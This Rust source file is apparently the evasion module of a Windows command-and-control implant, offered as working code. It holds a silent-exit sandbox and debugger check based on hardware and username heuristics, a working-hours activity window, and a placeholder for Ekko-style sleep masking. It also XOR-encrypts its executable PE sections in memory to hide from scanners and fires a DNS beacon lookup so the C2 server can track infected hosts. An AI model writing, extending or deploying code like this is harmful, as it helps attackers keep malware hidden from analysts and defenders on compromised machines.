/// Evasion module: sandbox detection, sleep masking, working hours, DNS canary.

/// Score-based sandbox check. Exits silently (exit code 0) if sandbox indicators detected.
pub fn sandbox_check() {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    use windows_sys::Win32::System::SystemInformation::{
        GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO,
    };
    use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

    unsafe {
        // Immediate exit if a debugger is attached
        if IsDebuggerPresent() != 0 {
            std::process::exit(0);
        }

        let mut score: u32 = 0;

        // CPU core count < 2 → sandbox indicator (+1)
        let mut si: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut si);
        if si.dwNumberOfProcessors < 2 {
            score += 1;
        }

        // Physical RAM < 2 GB → strong sandbox indicator (+3)
        let mut ms: MEMORYSTATUSEX = std::mem::zeroed();
        ms.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        GlobalMemoryStatusEx(&mut ms);
        if ms.ullTotalPhys < 2u64 * 1024 * 1024 * 1024 {
            score += 3;
        }

        // C: drive total size < 40 GB → sandbox indicator (+1)
        let c_drive: Vec<u16> = "C:\\\0".encode_utf16().collect();
        let mut free_caller = 0u64;
        let mut total = 0u64;
        GetDiskFreeSpaceExW(
            c_drive.as_ptr(),
            &mut free_caller,
            &mut total,
            std::ptr::null_mut(),
        );
        if total > 0 && total < 40u64 * 1024 * 1024 * 1024 {
            score += 1;
        }

        if score >= 4 {
            std::process::exit(0);
        }
    }

    // Username check — common sandbox / analyst account names
    let username = std::env::var("USERNAME")
        .unwrap_or_default()
        .to_ascii_lowercase();
    let sandbox_names = [
        "sandbox", "malware", "virus", "analyst", "cuckoo", "tester", "vm-", "vbox",
    ];
    if sandbox_names.iter().any(|n| username.contains(n)) {
        std::process::exit(0);
    }
}

/// Returns true if the current local time falls within the configured working-hours window,
/// or if `spec` is empty (no restriction). Format: "HH:MM-HH:MM", e.g. "08:00-18:00".
/// Handles overnight windows, e.g. "22:00-06:00".
pub fn in_working_hours(spec: &str) -> bool {
    if spec.is_empty() {
        return true;
    }
    let parts: Vec<&str> = spec.split('-').collect();
    if parts.len() != 2 {
        return true;
    }
    let parse_hhmm = |s: &str| -> Option<u32> {
        let c: Vec<&str> = s.split(':').collect();
        if c.len() != 2 {
            return None;
        }
        let h: u32 = c[0].parse().ok()?;
        let m: u32 = c[1].parse().ok()?;
        Some(h * 60 + m)
    };
    let start_min = match parse_hhmm(parts[0]) {
        Some(v) => v,
        None => return true,
    };
    let end_min = match parse_hhmm(parts[1]) {
        Some(v) => v,
        None => return true,
    };

    use windows_sys::Win32::Foundation::SYSTEMTIME;
    use windows_sys::Win32::System::SystemInformation::GetLocalTime;

    let mut st: SYSTEMTIME = unsafe { std::mem::zeroed() };
    unsafe { GetLocalTime(&mut st); }
    let now_min = u32::from(st.wHour) * 60 + u32::from(st.wMinute);

    if start_min <= end_min {
        // Normal daytime window, e.g. 08:00–18:00
        now_min >= start_min && now_min < end_min
    } else {
        // Overnight window, e.g. 22:00–06:00
        now_min >= start_min || now_min < end_min
    }
}

/// Sleep for `ms` milliseconds. Placeholder for Ekko-style sleep masking (timer+ROP).
// Real implementation requires the protect/XOR to happen while execution is in ntdll,
// not in .text — a future work item requiring SetWaitableTimer + RtlCaptureContext.
pub fn sleep_masked(ms: u64) {
    std::thread::sleep(std::time::Duration::from_millis(ms));
}

/// XOR all executable PE sections with a key byte (encrypt or decrypt in-place).
/// Used by MEM_FLUCTUATE command to trigger on-demand masking outside the sleep path.
pub fn fluctuate_sections(key: u8) {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        let base = GetModuleHandleW(std::ptr::null()) as usize as *mut u8;
        if base.is_null() { return; }
        let e_lfanew = *base.add(0x3c).cast::<i32>() as usize;
        let nt_base  = base.add(e_lfanew);
        if *nt_base.cast::<u32>() != 0x0000_4550 { return; }
        let num_sections  = *nt_base.add(6).cast::<u16>() as usize;
        let opt_header_sz = *nt_base.add(20).cast::<u16>() as usize;
        let sections_start = nt_base.add(4 + 20 + opt_header_sz);
        for i in 0..num_sections {
            let sec            = sections_start.add(i * 40);
            let virt_size      = *sec.add(8).cast::<u32>() as usize;
            let virt_addr      = *sec.add(12).cast::<u32>() as usize;
            let characteristics = *sec.add(36).cast::<u32>();
            if characteristics & 0x2000_0000 != 0 && virt_size > 0 {
                let ptr = base.add(virt_addr);
                let mut old = 0u32;
                if VirtualProtect(ptr as *const _, virt_size, 0x04, &mut old) != 0 {
                    let slice = std::slice::from_raw_parts_mut(ptr, virt_size);
                    for b in slice.iter_mut() { *b ^= key; }
                    let mut tmp = 0u32;
                    VirtualProtect(ptr as *const _, virt_size, old, &mut tmp);
                }
            }
        }
    }
}

/// Fire a DNS canary by resolving "beacon.<domain>".
/// If the C2 server runs an authoritative DNS for the domain, it logs this lookup
/// and can correlate implant activity.
pub fn dns_canary_check(domain: &str) {
    if domain.is_empty() {
        return;
    }
    // Null-terminate for getaddrinfo (expects a C string)
    let lookup = format!("beacon.{}\0", domain);

    use windows_sys::Win32::Networking::WinSock::{
        freeaddrinfo, getaddrinfo, WSAStartup, ADDRINFOA, WSADATA,
    };

    unsafe {
        let mut wsa_data: WSADATA = std::mem::zeroed();
        WSAStartup(0x0202, &mut wsa_data);

        let mut hints: ADDRINFOA = std::mem::zeroed();
        hints.ai_family = 0; // AF_UNSPEC — accept IPv4 or IPv6 answer

        let mut result: *mut ADDRINFOA = std::ptr::null_mut();
        getaddrinfo(
            lookup.as_ptr(),  // PCSTR (*const u8), null-terminated
            std::ptr::null(), // service name — NULL = any port
            &hints,
            &mut result,
        );
        if !result.is_null() {
            freeaddrinfo(result);
        }
    }
}
